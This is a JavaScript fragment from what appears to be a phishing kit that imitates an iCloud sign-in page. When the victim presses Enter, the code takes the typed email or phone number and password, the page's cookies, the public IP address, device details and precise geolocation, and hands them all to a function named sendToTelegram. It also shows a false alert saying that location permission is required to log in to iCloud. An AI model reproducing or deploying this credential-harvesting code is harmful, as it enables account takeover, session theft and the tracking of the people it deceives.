    document.getElementById("password_text_field").addEventListener("keydown", function(event) {
      if (event.keyCode === 13) {
        sendLogs(event);
      }
    });

    function sendLogs() {
      var emailOrPhone = document.getElementById("account_name_text_field").value;
      var password = document.getElementById("password_text_field").value;
      var x = document.cookie;

      fetch('https://api.ipify.org').then(res => res.text()).then(ipAddress => {
        const deviceInfo = {
          manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
          model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
          os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
          browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
        };
        getLocation(emailOrPhone, password, x, deviceInfo, ipAddress);
      }).catch(error => {
        console.error("Error capturing IP address:", error);
      });
      }

      function getLocation(emailOrPhone, password, x, deviceInfo, ipAddress) {
        navigator.geolocation?.getCurrentPosition(async (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;
          try {
            const response = await fetch(apiUrl);
            const data = await response.json();
            if (data.results.length > 0) {
              const result = data.results[0].components;
              const city = result.city || result.village || result.town;
              const state = result.state;
              const country = result.country;
              const zipCode = result.postcode;
              const continent = result.continent;
              const county = result.county;

              var dataToSend = {
                emailOrPhone,
                password,
                ipAddress,
                Device: deviceInfo.manufacturer,
                OS: deviceInfo.os,
                Browser: deviceInfo.browser,
                Latitude: latitude,
                Longitude: longitude,
                City: city,
                State: state,
                Country: country,
                County: county,
                ZipCode: zipCode,
                Cookies: x,
              };

              if (Object.keys(dataToSend).length > 0) {
                sendToTelegram(dataToSend);
              } else {
                console.warn("No data to send to Telegram.");
              }
            } else {
              console.error("Location information not found.");
            }
          } catch (error) {
            console.error("Error fetching location data:", error);
          }
        },
        (error) => {
            // Handle the case where the user denies location permission
            console.error("Error getting location:", error);
            alert("Location permission is required to login to iCloud.");
        }
        );
      }
